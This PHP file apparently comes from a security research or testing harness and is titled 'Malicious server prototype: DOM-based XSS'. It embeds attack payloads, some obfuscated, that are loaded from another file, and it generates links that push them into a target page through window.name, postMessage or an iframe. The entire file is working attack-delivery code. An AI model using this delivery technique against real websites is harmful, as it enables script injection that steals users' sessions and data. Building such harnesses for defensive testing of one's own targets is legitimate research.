<?php
include('../declare.php');
include(INCDIR.'payload.php');

$errors = array();

function PrepareScript($testname, $obfu, $subs) {
  if (is_array($subs)) {
    // Keys from the argument will overwrite those from the base array.
    $subs = array_merge(GetBaseSubs(), $subs);
  } else if ($subs) {
    // A truthy value indicates that the base array should be used.
    $subs = GetBaseSubs();
  }
  if (is_string($obfu)) {
    $code = GetObfuscatedPayload($testname, $obfu, $subs);
  } else {
    $code = GetPayload($testname, $subs);
  }
  $code = str_replace(array("\\", "'", "\n",  "\r"), array("\\\\", "\\'", '\\n', '\\r'), $code);
  return $code;
}

function PrepareImage($src) {
  $src = str_replace('"', '\\"', $src);
  return '<img src="'.$src.'" />';
}

$attacks = LoadAttacks();

$title = "Malicious server prototype: DOM-based XSS";
include(INCDIR.'header.php');

if (sizeof($errors) > 0) {
?>
<p id="errors"><?=implode('<br/>', $errors)?></p>
<?
}
// Output a link for each obfuscation of each payload.
?>
<script type="text/javascript">
//<![CDATA[
var payloads = {
<?
// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $jname = str_replace("'", "\\'", $aname);
?>
  '<?=$jname?>': {  
<?
  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
    $job = str_replace("'", "\\'", $ob);
    // $pl is already escaped for embedding in single-quotes.
?>
    '<?=$job?>': '<?=$pl?>',
<?
  }
?>
  }, // /<?=$ob?>

<?
}
?>
}; // /payloads
function communicate(fn) {
  this.postMessage(fn, '*');
}
function windowNameAttack(att, obfu, tgt) {

  var plsub = payloads[att];
  if (plsub === undefined) {
    alert('Attack not found: ' + att);
    return false;
  }

  var fn = plsub[obfu];
  if (fn === undefined) {
    alert('Obfuscation not found: ' + obfu);
    return false;
  }

  var newwin = window.open(tgt, fn);

  return true;
}
function postMessageAttack(att, obfu, tgt) {
  var newwin = window.open(tgt, "target");

  var plsub = payloads[att];
  if (plsub === undefined) {
    alert('Attack not found: ' + att);
    return false;
  }

  var fn = plsub[obfu];
  if (fn === undefined) {
    alert('Obfuscation not found: ' + obfu);
    return false;
  }

  var com = communicate.bind(newwin, fn);
  setTimeout(com, 3000);

  return true;
}
function loadIframe(att, obfu, tgt) {
  var frame = document.createElement('iframe');
  frame.width = '400px';
  frame.height = '400px';

  var plsub = payloads[att];
  if (plsub === undefined) {
    alert('Attack not found: ' + att);
    return false;
  }

  frame.src = tgt;
  //frame.sandbox = "allow-same-origin allow-top-navigation allow-forms allow-popups allow-scripts allow-pointer-lock";
  
  var embed = document.getElementById('embed');
  var last;
  while (last = embed.lastChild) embed.removeChild(last);

  embed.appendChild(frame);

  var fn = plsub[obfu];
  if (fn === undefined) {
    alert('Obfuscation not found: ' + obfu);
    return false;
  }
  var com = communicate.bind(frame.contentWindow, fn);
  frame.addEventListener('load', com);

  return false;
}
//]]>
</script>
<h1>DOM-based XSS</h1>
<p class="instructions">
Clicking on the links below will initiate DOM-based XSS attacks on the
target server via an embedding exploit.
</p>
<!--
<div id="embed">
</div>
-->
<?
// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $hname = htmlspecialchars($aname);
  $escname = str_replace("'", "\\'", $aname);
?>
<h3 id="<?=$hname?>" ><?=$hname?></h3>
<?
  if (isset($attack['#comment'])) {
?>
<p class="comment"><?=htmlspecialchars($attack['#comment'])?></p>
<?
  }
  $escatt = str_replace("'", '\\"', $aname);

  $tgt = TGTROOT."dombased/woven/target-dombased-target.repack.html";
  $esctgt = str_replace("'", "\\'", $tgt);
  $onclick = "return windowNameAttack('".$escatt."', 'basic', '".$esctgt."');";
  //$onclick = "return postMessageAttack('".$escatt."', 'basic', '".$esctgt."');";
  $escoc = str_replace('"', '\\"', $onclick);
?>
<a href="#" onclick="<?=$escoc?>">woven</a>
<?

  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
    $escob = str_replace("'", "\\'", $ob);
    $tgt = TGTROOT."dombased/target";
    $esctgt = str_replace("'", "\\'", $tgt);

    //$winatt = "return postMessageAttack('".$escatt."', '".$escob."', '".$esctgt."');";
    $winatt = "return windowNameAttack('".$escatt."', '".$escob."', '".$esctgt."');";
    $escwin = str_replace('"', '\\"', $winatt);

    $frameatt = "return loadIframe('".$escatt."', '".$escob."', '".$esctgt."');";
    $escframe = str_replace('"', '\\"', $frameatt);
?>
| <a href="#" onclick="<?=$escwin?>"><?=htmlspecialchars($ob)?></a>
<!--| Frame: <a href="#" onclick="<?=$escframe?>"><?=htmlspecialchars($ob)?></a>-->
<?
  }
}

$links = array(
  'dom-based XSS start' => TGTROOT."dombased/start",
);
include(INCDIR.'footer.php');
?>
